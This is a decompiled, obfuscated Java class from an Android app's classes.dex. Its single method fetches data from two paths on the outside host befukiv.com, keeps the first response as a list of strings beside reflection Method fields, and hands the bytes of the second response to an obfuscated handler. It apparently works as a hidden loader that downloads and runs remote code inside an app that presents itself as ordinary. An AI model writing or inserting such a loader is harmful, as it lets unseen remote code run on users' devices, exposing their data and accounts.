package e5;

import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import y4.r;

/* loaded from: classes.dex */
public final class m {

    /* renamed from: a */
    public static Method f3832a;

    /* renamed from: b */
    public static Method f3833b;

    /* renamed from: c */
    public static Method f3834c;

    /* renamed from: d */
    public static Method f3835d;
    public static Method e;

    /* renamed from: f */
    public static Method f3836f;

    /* renamed from: g */
    public static AtomicReference<String[]> f3837g = new AtomicReference<>();

    /* renamed from: h */
    public static final g6.i f3838h = new g6.i(7);

    /* renamed from: i */
    public static AtomicBoolean f3839i = new AtomicBoolean();

    public static void a() {
        String str;
        y4.p pVar = new y4.p();
        r.a aVar = new r.a();
        aVar.c("https://befukiv.com/muchaspuchas");
        y4.r a7 = aVar.a();
        r.a aVar2 = new r.a();
        aVar2.c("https://befukiv.com/cortina");
        y4.r a8 = aVar2.a();
        try {
            y4.t tVar = new y4.d(pVar, a7).a().f6804g;
            byte[] b2 = tVar.b();
            y4.o e7 = tVar.e();
            Charset charset = z4.h.f6957c;
            if (e7 != null && (str = e7.f6764b) != null) {
                charset = Charset.forName(str);
            }
            f3837g.set(new String(b2, charset.name()).split("\\|"));
            byte[] b7 = new y4.d(pVar, a8).a().f6804g.b();
            if (f3839i.get()) {
                return;
            }
            f3838h.getClass();
            g6.i.h(b7);
            f3839i.set(true);
        } catch (Throwable th) {
            th.printStackTrace();
        }
    }
}
